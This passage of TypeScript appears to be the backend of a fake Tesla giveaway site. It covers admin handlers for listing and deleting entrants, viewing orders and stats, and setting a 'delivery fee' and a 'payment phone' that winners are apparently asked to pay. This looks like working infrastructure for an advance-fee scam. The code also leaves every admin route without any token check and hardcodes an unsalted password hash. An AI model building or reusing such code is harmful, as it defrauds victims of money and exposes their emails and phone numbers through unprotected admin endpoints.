              <p style="margin:0;font-size:11px;color:#b0b3b8;">Tesla&reg; is a registered trademark of Tesla, Inc. This is an independent award program.</p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

// ── ADMIN HANDLERS ────────────────────────────────────────────────────────────
const ADMIN_PASSWORD_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e83198408c64e9defa8ff52cf3";

async function sha256(text: string): Promise<string> {
  const data = new TextEncoder().encode(text);
  const hash = await crypto.subtle.digest("SHA-256", data);
  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
}

async function handleAdminAuth(req: Request) {
  let body: { password?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  if (!body.password) return json({ error: "Password required" }, 400);
  const hash = await sha256(body.password);
  if (hash !== ADMIN_PASSWORD_HASH) return json({ error: "Invalid password" }, 401);
  const token = hexRandom(32);
  await dbInsert("admin_settings", { key: "session_" + token, value: { created: new Date().toISOString() } });
  return json({ success: true, token });
}

async function handleAdminUsers(_req: Request) {
  const r = await fetch(REST + "/giveaway_users?select=id,auth_user_id,email,phone,first_name,last_name,verification_status,entry_count,created_at,verified_at&order=created_at.desc&limit=500", { headers: SB_HEADERS });
  if (!r.ok) return json({ error: "Failed to fetch users" }, 500);
  const users = await r.json();
  return json({ users });
}

async function handleAdminDeleteUser(req: Request) {
  let body: { id?: string; email?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  const { id, email } = body;
  if (!id && !email) return json({ error: "User ID or email required" }, 400);
  
  const filter = id ? { id: "eq." + id } : { email: "eq." + (email || "") };
  const qs = buildQs("id,auth_user_id", filter, "limit=1");
  const lookup = await fetch(REST + "/giveaway_users?" + qs, { headers: SB_HEADERS });
  if (!lookup.ok) return json({ error: "User not found" }, 404);
  const rows = await lookup.json();
  const user = rows[0];
  if (!user) return json({ error: "User not found" }, 404);
  
  if (user.auth_user_id) {
    await fetch(AUTH + "/admin/users/" + user.auth_user_id, { method: "DELETE", headers: SB_HEADERS });
  }
  const delR = await fetch(REST + "/giveaway_users?id=eq." + user.id, { method: "DELETE", headers: SB_HEADERS });
  if (!delR.ok) return json({ error: "Failed to delete user" }, 500);
  return json({ success: true });
}

async function handleAdminGetSettings() {
  const feeR = await fetch(REST + "/admin_settings?select=key,value&key=eq.delivery_fee&limit=1", { headers: SB_HEADERS });
  const phoneR = await fetch(REST + "/admin_settings?select=key,value&key=eq.payment_phone&limit=1", { headers: SB_HEADERS });
  
  let deliveryFee = 299;
  let paymentPhone = "+1 (581) 478-3495";
  
  if (feeR.ok) {
    const feeRows = await feeR.json();
    if (feeRows[0]?.value?.amount) deliveryFee = feeRows[0].value.amount;
  }
  if (phoneR.ok) {
    const phoneRows = await phoneR.json();
    if (phoneRows[0]?.value?.number) paymentPhone = phoneRows[0].value.number;
  }
  
  return json({ deliveryFee, paymentPhone });
}

async function handleAdminSaveSettings(req: Request) {
  let body: { deliveryFee?: number; paymentPhone?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  
  // Save delivery fee
  if (body.deliveryFee !== undefined) {
    const r = await fetch(REST + "/admin_settings?key=eq.delivery_fee", {
      method: "PATCH",
      headers: { ...SB_HEADERS, Prefer: "return=minimal" },
      body: JSON.stringify({ value: { amount: body.deliveryFee }, updated_at: new Date().toISOString() }),
    });
    if (!r.ok) {
      const insR = await fetch(REST + "/admin_settings", {
        method: "POST",
        headers: { ...SB_HEADERS, Prefer: "return=minimal" },
        body: JSON.stringify({ key: "delivery_fee", value: { amount: body.deliveryFee } }),
      });
      if (!insR.ok) return json({ error: "Failed to save delivery fee" }, 500);
    }
  }
  
  // Save payment phone
  if (body.paymentPhone !== undefined) {
    const pr = await fetch(REST + "/admin_settings?key=eq.payment_phone", {
      method: "PATCH",
      headers: { ...SB_HEADERS, Prefer: "return=minimal" },
      body: JSON.stringify({ value: { number: body.paymentPhone }, updated_at: new Date().toISOString() }),
    });
    if (!pr.ok) {
      const insR = await fetch(REST + "/admin_settings", {
        method: "POST",
        headers: { ...SB_HEADERS, Prefer: "return=minimal" },
        body: JSON.stringify({ key: "payment_phone", value: { number: body.paymentPhone } }),
      });
      if (!insR.ok) return json({ error: "Failed to save payment phone" }, 500);
    }
  }
  
  return json({ success: true, deliveryFee: body.deliveryFee, paymentPhone: body.paymentPhone });
}

async function handleAdminOrders(_req: Request) {
  const r = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,giveaway_users(email)&order=order_date.desc&limit=200", { headers: SB_HEADERS });
  if (!r.ok) return json({ orders: [] });
  const rows = await r.json();
  const orders = rows.map((row: any) => {
    const user = Array.isArray(row.giveaway_users) ? row.giveaway_users[0] : row.giveaway_users;
    return {
      orderId: row.order_id,
      trackingNumber: row.tracking_number,
      email: user?.email ?? "",
      status: row.status,
      estimatedDelivery: row.estimated_delivery,
      orderDate: row.order_date,
      deliveryMethod: row.delivery_method ?? {},
      paymentMethod: row.payment_method ?? {},
      selectedCar: {}
    };
  });
  return json({ orders });
}

async function handleAdminGetStats() {
  const r = await fetch(REST + "/giveaway_users?select=verification_status", { headers: SB_HEADERS });
  if (!r.ok) return json({ total: 0, verified: 0, pending: 0 });
  const users = await r.json();
  const total = users.length;
  const verified = users.filter((u: any) => u.verification_status === "verified").length;
  const pending = total - verified;
  
  const feeR = await fetch(REST + "/admin_settings?select=value&key=eq.delivery_fee&limit=1", { headers: SB_HEADERS });
  let deliveryFee = 299;
  if (feeR.ok) {
    const feeRows = await feeR.json();
    if (feeRows[0]?.value?.amount) deliveryFee = feeRows[0].value.amount;
  }
  
  return json({ total, verified, pending, deliveryFee });
}

// ── MAIN ──────────────────────────────────────────────────────────────────────
Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });

  const url = new URL(req.url);
  const route = url.pathname.replace(/^\/(functions\/v1\/)?tesla-api/, "").replace(/\/$/, "") || "/";

  console.log("Route:", route, "| Method:", req.method);

  try {
    if (route === "/api/health" || route === "/health" || route === "") return await handleHealth();
    if (route === "/api/entry" && req.method === "POST") return await handleEntry(req);
    if (route === "/api/verify" && req.method === "GET") return await handleVerify(req);
    if (route === "/api/resend" && req.method === "POST") return await handleResend(req);
    if (route === "/api/login" && req.method === "POST") return await handleLogin(req);
    if (route === "/api/session" && req.method === "GET") return await handleSession(req);
    if (route === "/api/order" && req.method === "POST") return await handleOrder(req);
    const trackM = route.match(/^\/api\/order\/tracking\/([^/]+)$/);
    if (trackM && req.method === "GET") return await handleTracking(trackM[1]);
    const orderM = route.match(/^\/api\/order\/([^/]+)$/);
    if (orderM && req.method === "GET") return await handleOrderLookup(orderM[1]);
    // Admin routes
    if (route === "/api/admin/auth" && req.method === "POST") return await handleAdminAuth(req);
    if (route === "/api/admin/users" && req.method === "GET") return await handleAdminUsers(req);
    if (route === "/api/admin/users/delete" && req.method === "POST") return await handleAdminDeleteUser(req);
    if (route === "/api/admin/settings" && req.method === "GET") return await handleAdminGetSettings();
    if (route === "/api/admin/settings" && req.method === "POST") return await handleAdminSaveSettings(req);
    if (route === "/api/admin/orders" && req.method === "GET") return await handleAdminOrders(req);
    if (route === "/api/admin/stats" && req.method === "GET") return await handleAdminGetStats();
    return json({ error: "Not found." }, 404);
  } catch (err) {
    console.error("Unhandled error:", err);
    return json({ error: "Internal server error." }, 500);
  }
});
